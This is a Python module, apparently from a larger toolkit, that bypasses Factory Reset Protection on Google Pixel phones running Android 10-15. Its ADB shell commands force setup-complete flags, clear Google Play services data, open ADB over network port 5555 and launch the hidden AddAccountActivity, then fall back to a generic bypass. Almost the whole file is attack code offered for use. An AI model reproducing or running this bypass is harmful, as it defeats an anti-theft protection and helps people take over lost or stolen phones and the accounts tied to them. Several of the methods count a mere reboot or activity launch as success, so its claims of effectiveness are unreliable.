"""
Google Pixel FRP Bypass Module (Combined)

Combined implementation of Google Pixel FRP bypass methods from:
- google_frp.py (setup wizard, ADB network, recovery bypass)
- google_pixel_frp_exploit.py (AddAccountActivity, development settings)

Supports Pixel 6-10 with Android 10-15.

Features:
- Setup Wizard bypass for Android 15
- ADB network activation
- Google account removal via settings
- Recovery mode bypass
- Hidden AddAccountActivity launch
- Development settings activity fallback
"""

import logging
from typing import Dict, Any, Optional, List
import time
import re

from utils.logger import get_logger
from core.adb_bridge import ADBBridge
from core.bypass.generic_frp import GenericFRPBypass


class GooglePixelFRP:
    """Combined Google Pixel FRP bypass implementation."""
    
    def __init__(self, device_info: Dict[str, Any], logger: Optional[logging.Logger] = None):
        self.device_info = device_info
        self.logger = logger or get_logger("bypass")
        self.adb = ADBBridge()
        self.serial = device_info.get('serial')
    
    def is_pixel_device(self) -> bool:
        """Check if device is a Google Pixel"""
        brand = self.device_info.get('brand', '').lower()
        model = self.device_info.get('model', '').lower()
        return 'google' in brand or 'pixel' in model
    
    def _android_version(self) -> int:
        """Get Android version as integer"""
        success, output = self.adb.shell('getprop ro.build.version.release', self.serial)
        if not success:
            return 0
        version = re.findall(r'\d+', output)
        return int(version[0]) if version else 0
    
    def is_vulnerable(self) -> bool:
        """Check if device is vulnerable to Pixel FRP bypass"""
        if self.device_info.get('platform') != 'android':
            return False
        if not self.is_pixel_device():
            return False
        version = self._android_version()
        return 10 <= version <= 15
    
    def _bypass_pixel_setup_wizard(self) -> bool:
        """Bypass FRP via Pixel setup wizard manipulation (Android 15)"""
        try:
            success1 = self.adb.shell("settings put secure user_setup_complete 1", self.serial)[0]
            success2 = self.adb.shell("settings put global device_provisioned 1", self.serial)[0]
            success3 = self.adb.shell("settings put secure setup_wizard_has_run 1", self.serial)[0]
            success4 = self.adb.shell("pm clear com.google.android.gms", self.serial)[0]
            return all([success1, success2, success3, success4])
        except Exception as e:
            self.logger.error(f"Pixel setup wizard bypass failed: {e}")
            return False
    
    def _bypass_pixel_adb_network(self) -> bool:
        """Enable ADB over network for Pixel devices"""
        try:
            success1 = self.adb.shell("setprop service.adb.tcp.port 5555", self.serial)[0]
            success2 = self.adb.shell("stop adbd && start adbd", self.serial)[0]
            success3, ip_output = self.adb.shell("ip route", self.serial)
            if success3:
                ip = self._extract_ip(ip_output)
                if ip:
                    self.logger.info(f"ADB network enabled at {ip}:5555")
                    return True
            return False
        except Exception as e:
            self.logger.error(f"Pixel ADB network bypass failed: {e}")
            return False
    
    def _bypass_pixel_recovery(self) -> bool:
        """Bypass FRP via recovery mode"""
        try:
            success1 = self.adb.shell("reboot recovery", self.serial)[0]
            if success1:
                self.logger.info("Booted to recovery for FRP bypass")
                return True
            return False
        except Exception as e:
            self.logger.error(f"Pixel recovery bypass failed: {e}")
            return False
    
    def _launch_add_account_activity(self) -> bool:
        """Launch hidden AddAccountActivity on Pixel devices"""
        try:
            success, output = self.adb.shell(
                'am start -n com.google.android.gsf/.login.AddAccountActivity --activity-clear-task',
                self.serial,
                timeout=20
            )
            if success and 'Error' not in output:
                self.logger.info('AddAccountActivity launched successfully.')
                return True
            self.logger.debug(f'AddAccountActivity response: {output.strip()}')
            return False
        except Exception as e:
            self.logger.error(f'AddAccountActivity launch failed: {e}')
            return False
    
    def _fallback_development_activity(self) -> bool:
        """Fallback to development settings activity"""
        try:
            success, output = self.adb.shell(
                'am start -n com.android.settings/.Settings$DevelopmentSettingsActivity',
                self.serial,
                timeout=20
            )
            if success and 'Error' not in output:
                self.logger.info('Development settings activity launched successfully.')
                return True
            self.logger.debug(f'Development settings activity response: {output.strip()}')
            return False
        except Exception as e:
            self.logger.error(f'Development settings activity launch failed: {e}')
            return False
    
    def _extract_ip(self, ip_output: str) -> Optional[str]:
        """Extract IP address from ip route output"""
        match = re.search(r'src (\d+\.\d+\.\d+\.\d+)', ip_output)
        return match.group(1) if match else None
    
    def execute(self) -> bool:
        """Execute Google Pixel FRP bypass"""
        self.logger.info("Starting Google Pixel FRP bypass")
        
        # Try Pixel-specific methods first
        pixel_methods = [
            self._bypass_pixel_setup_wizard,
            self._bypass_pixel_adb_network,
            self._bypass_pixel_recovery,
            self._launch_add_account_activity,
            self._fallback_development_activity
        ]
        
        for method in pixel_methods:
            method_name = method.__name__.replace('_bypass_pixel_', '').replace('_', ' ')
            self.logger.info(f"Attempting Pixel FRP bypass via {method_name}")
            try:
                if method():
                    self.logger.info(f"Pixel FRP bypass successful via {method_name}")
                    return True
            except Exception as e:
                self.logger.error(f"Pixel FRP bypass method {method_name} failed: {e}")
                continue
        
        # Fall back to generic methods
        self.logger.info("Pixel-specific methods failed, trying generic FRP bypass")
        try:
            generic = GenericFRPBypass(self.device_info, self.logger)
            return generic.bypass()
        except Exception as e:
            self.logger.error(f"Generic FRP bypass failed: {e}")
            return False
    
    def exploit(self) -> bool:
        """Legacy exploit interface for compatibility"""
        return self.execute()
    
    def bypass(self) -> bool:
        """Main bypass interface"""
        return self.execute()
